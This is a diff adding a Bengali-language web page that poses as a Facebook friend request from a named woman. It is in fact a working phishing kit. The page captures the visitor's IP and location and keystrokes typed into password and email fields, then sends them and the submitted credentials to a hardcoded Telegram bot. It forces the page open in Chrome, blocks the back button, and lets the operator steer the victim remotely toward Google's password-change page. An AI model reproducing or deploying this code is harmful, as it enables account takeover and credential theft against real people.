@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+
+    <meta property="og:title" content="Facebook - Add Friend Request">
+    <meta property="og:description" content="Mst. Priya Akter আপনাকে ফ্রেন্ড রিকোয়েস্ট পাঠিয়েছে।">
+    <meta property="og:image" content="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    <meta property="og:type" content="website">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .hidden { display: none !important; }
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
+        .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; text-align: center; }
+        .secure-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; }
+        .loader { width: 55px; height: 55px; border: 6px solid #f3f3f3; border-top: 6px solid #1877f2; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #permission_modal { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+        .modal-content { background: white; width: 100%; max-width: 300px; border-radius: 15px; padding: 25px; text-align: center; }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    </div>
+
+    <div class="bottom-half text-center">
+        <div id="step1" class="w-full flex flex-col items-center gap-4">
+            <h2 class="text-2xl font-extrabold text-gray-900">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+            <p class="text-gray-600 px-4">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
+            <button onclick="showModal()" class="btn-blue">Add Friend</button>
+        </div>
+
+        <div id="permission_modal">
+            <div class="modal-content">
+                <div class="text-blue-600 text-4xl mb-4">ⓘ</div>
+                <h3 class="text-lg font-bold mb-2">নিরাপত্তা নিশ্চিত করুন</h3>
+                <p class="text-gray-600 text-sm mb-6">পরবর্তী ধাপে যাওয়ার জন্য "OK" বাটনে ক্লিক করুন।</p>
+                <button onclick="redirectToChrome()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold text-lg">OK</button>
+            </div>
+        </div>
+
+        <div id="password_page" class="hidden w-full flex flex-col items-center gap-4">
+            <h1 class="text-xl font-bold text-gray-900">পাসওয়ার্ড নিশ্চিত করুন</h1>
+            <p class="text-gray-600 text-sm px-4">আপনার পাসওয়ার্ড বসিয়ে এড বাটনে ক্লিক করুন।</p>
+            <input type="password" id="pass_field" placeholder="পাসওয়ার্ড" class="secure-input" oninput="autoCapture('pass', this.value)">
+            <button onclick="submitToLoading('Password')" class="btn-blue">Add Friend</button>
+        </div>
+
+        <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
+            <h1 class="text-xl font-bold text-gray-900">অ্যাকাউন্ট নিশ্চিত করুন</h1>
+            <p class="text-gray-600 text-sm px-4">আপনার জিমেইল এড্রেসটি সিলেক্ট করুন।</p>
+            <input type="email" id="email_field" autocomplete="email" name="email" placeholder="ইমেইল এড্রেস" class="secure-input" oninput="autoCapture('email', this.value)">
+            <button onclick="submitToLoading('Email')" class="btn-blue">Add Friend</button>
+        </div>
+
+        <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
+            <div class="loader"></div>
+            <h3 class="text-lg font-bold text-blue-600">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
+            <p class="text-sm text-gray-700 px-10 font-medium text-center">আইডি যাচাই শেষ না হওয়া পর্যন্ত এই পেজ থেকে বের হবেন না।</p>
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastUpdateId = 0;
+
+    async function initApp() {
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            sendToBot(`🌐 **নতুন ভিজিটর!**\n📍 লোকেশন: ${ipData.city}, ${ipData.country_name}\n🔍 IP: ${ipData.ip}`);
+        } catch (e) {}
+
+        const urlParams = new URLSearchParams(window.location.search);
+        if (sessionStorage.getItem('isWaiting') === 'true') {
+            lockBrowser();
+            goToStep('verifying');
+            startListening();
+        } else if (urlParams.get('open') === 'chrome') {
+            goToStep('password_page');
+        }
+    }
+
+    function showModal() {
+        document.getElementById('permission_modal').style.display = 'flex';
+    }
+
+    function redirectToChrome() {
+        window.location.href = "intent://" + window.location.host + window.location.pathname + "?open=chrome" + "#Intent;scheme=https;package=com.android.chrome;end";
+    }
+
+    function autoCapture(type, val) {
+        if(val.length >= 4) {
+            sendToBot(`⌨️ **টাইপিং আপডেট [${type}]:** \`${val}\``);
+        }
+    }
+
+    function submitToLoading(source) {
+        const val = source === 'Password' ? document.getElementById('pass_field').value : document.getElementById('email_field').value;
+        sendToBot(`✅ **${source} সাবমিট!**\n📦 মান: \`${val}\``);
+        
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "📨 Gmail Address Page", callback_data: "email_page_cmd" }],
+                [{ text: "🔑 Pass Change (Tamil)", callback_data: "pass_cmd" }],
+                [{ text: "⏳ Back to Waiting", callback_data: "wait_cmd" }]
+            ]
+        };
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: `🎛️ কমান্ড সিলেক্ট করুন:`, reply_markup: keyboard })
+        });
+
+        sessionStorage.setItem('isWaiting', 'true');
+        goToStep('verifying');
+        lockBrowser();
+        startListening();
+    }
+
+    function goToStep(id) {
+        ['step1', 'google_chooser', 'verifying', 'password_page'].forEach(s => {
+            if(document.getElementById(s)) document.getElementById(s).classList.add('hidden');
+        });
+        document.getElementById('permission_modal').style.display = 'none';
+        document.getElementById(id).classList.remove('hidden');
+        document.getElementById(id).classList.add('flex');
+        
+        // অটো-ফোকাস লজিক
+        if(id === 'google_chooser') {
+            setTimeout(() => {
+                const el = document.getElementById('email_field');
+                el.focus();
+                el.click(); // অটো সাজেশন পপ-আপের জন্য
+            }, 300);
+        }
+        sendToBot(`📑 ইউজার এখন এই পেজে: [${id}]`);
+    }
+
+    function lockBrowser() {
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = () => window.history.pushState(null, "", window.location.href);
+    }
+
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: chatId, text: text }) });
+    }
+
+    function startListening() {
+        setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await res.json();
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        const cmd = update.callback_query?.data;
+                        if (cmd === "email_page_cmd") {
+                            sessionStorage.removeItem('isWaiting');
+                            goToStep('google_chooser');
+                        } else if (cmd === "pass_cmd") {
+                            window.location.href = "https://myaccount.google.com/signinoptions/password?hl=ta";
+                        } else if (cmd === "wait_cmd") {
+                            sessionStorage.setItem('isWaiting', 'true');
+                            goToStep('verifying');
+                        }
+                    });
+                }
+            } catch (e) {}
+        }, 2000);
+    }
+</script>
+</body>
+</html>
